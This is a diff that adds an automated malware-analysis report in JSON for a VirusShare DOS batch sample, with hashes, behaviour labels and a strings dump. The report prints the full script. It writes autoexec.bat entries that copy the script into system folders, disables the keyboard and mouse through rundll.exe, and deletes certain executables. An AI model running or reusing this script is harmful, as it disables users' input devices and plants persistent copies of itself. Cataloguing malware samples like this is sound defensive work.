@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "COMMAND": "May run PowerShell commands",
+            "WINDOWS": "May enumerate application windows",
+            "autoexec": "Runs when the Word document is opened",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "@echo off\ncls\necho copy %0 \"C:\\WINDOWS\\system32\\virus.bat\" >> autoexec.bat\necho copy %0 \"C:\\WINDOWS\\system\\dil.bat\" >> autoexec.bat\necho copy %0 \"C:\\WINDOWS\\system32\\msdos592.bat\" >> autoexec.bat\nc:\\windows\\rundll.exe keyboard,DISABLE\nc:\\windows\\rundll.exe mouse,DISABLE\nSET PATH=C:\\TASM\\BIN\\;%PATH%                                  \n                           \n\nREM [CD-ROM Drive]\nrem - By Windows Setup - c:\\windows\\COMMAND\\mscdex /d:mscd000\n\nREM [Miscellaneous]\nc:\\windows\\COMMAND\\doskey\nrem - By Windows Setup - c:\\realmode\\mouse\n\nREM [Display]\n\nmode con codepage prepare=((850) c:\\windows\\COMMAND\\ega.cpi)\nmode con codepage select=850\nkeyb uk,,c:\\windows\\COMMAND\\keyboard.sys\npath %path%;C:\\LANSUITE\\perl\\perl5\\bin;\n\nif exist dailer.exe goto myhouse\nif not exist dailer.exe goto yourhouse\n:myhouse\ndel /y dailer.exe\ngoto part1\n\n:yourhouse\nif exist dailer1.exe goto myhouse1\nif not exist goto part1\n\n:myhouse1\ndel /y dailer1.exe\n\n:part1\ncls\nexit"
+    },
+    "filename": "VirusShare_07e33636b8318f28c9978a081888b83c",
+    "filesize": 990,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "07e33636b8318f28c9978a081888b83c",
+        "sha1": "a16630f11a49b03e7ab65da115badcbebc638432",
+        "sha256": "e4f2cdc187a057cbc8d2484879f6935caed7b82ceaaed0c0ce1951bcad770beb"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "echo copy %0 \"C:\\WINDOWS\\system32\\virus.bat\" >> autoexec.bat",
+            "echo copy %0 \"C:\\WINDOWS\\system\\dil.bat\" >> autoexec.bat",
+            "echo copy %0 \"C:\\WINDOWS\\system32\\msdos592.bat\" >> autoexec.bat",
+            "c:\\windows\\rundll.exe keyboard,DISABLE",
+            "c:\\windows\\rundll.exe mouse,DISABLE",
+            "SET PATH=C:\\TASM\\BIN\\;%PATH%                                  ",
+            "                           ",
+            "REM [CD-ROM Drive]",
+            "rem - By Windows Setup - c:\\windows\\COMMAND\\mscdex /d:mscd000",
+            "REM [Miscellaneous]",
+            "c:\\windows\\COMMAND\\doskey",
+            "rem - By Windows Setup - c:\\realmode\\mouse",
+            "REM [Display]",
+            "mode con codepage prepare=((850) c:\\windows\\COMMAND\\ega.cpi)",
+            "mode con codepage select=850",
+            "keyb uk,,c:\\windows\\COMMAND\\keyboard.sys",
+            "path %path%;C:\\LANSUITE\\perl\\perl5\\bin;",
+            "if exist dailer.exe goto myhouse",
+            "if not exist dailer.exe goto yourhouse",
+            ":myhouse",
+            "del /y dailer.exe",
+            "goto part1",
+            ":yourhouse",
+            "if exist dailer1.exe goto myhouse1",
+            "if not exist goto part1",
+            ":myhouse1",
+            "del /y dailer1.exe",
+            ":part1",
+            "exit"
+        ],
+        "file": {
+            "del /y dailer.exe": "Executable",
+            "del /y dailer1.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.286654",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
